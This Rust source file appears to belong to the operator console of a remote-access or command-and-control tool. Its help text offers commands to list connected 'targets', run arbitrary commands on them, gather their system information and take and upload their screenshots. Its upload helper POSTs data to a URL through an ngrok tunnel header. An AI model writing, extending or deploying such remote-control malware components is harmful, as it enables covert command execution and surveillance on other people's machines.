
use colored::Colorize;
use curl::easy::{Easy, List};

pub const HELP_STR: &str = r#"Available commands:
- list: Lists connected targets and whether they are online.
- info [target]: Gets system information about [target].
- run [target]: Runs the command/s presented by the user in the next line on [target].
- screenshot [target]: Takes a screenshot of [target] and uploads the result.
- exit: Exits the program.
"#;

pub fn output_line_response(line: String) {
    println!("[{}]\n{}\n", ">".bold().yellow(), line);
}

pub fn output_line_sys(line: String) {
    println!("[{}]\n{}\n", "sys".bold().blue(), line);
}

pub fn upload_file_and_add_result_to_str(url: &String, data: &String, r_output: &mut String) {
    let mut request = Easy::new();

    request.url(url).unwrap();

    let mut headers = List::new();
    headers.append("ngrok-skip-browser-warning: \"ah\"").unwrap();

    request.http_headers(headers).unwrap();
    
    request.post(true).unwrap();
    request.post_fields_copy(data.as_bytes()).unwrap();

    let mut transfer = request.transfer();
    transfer.write_function(|data| {
        *r_output = String::from_utf8_lossy(data).to_string();
        Ok(data.len())
    }).unwrap();

    transfer.perform().unwrap();
}
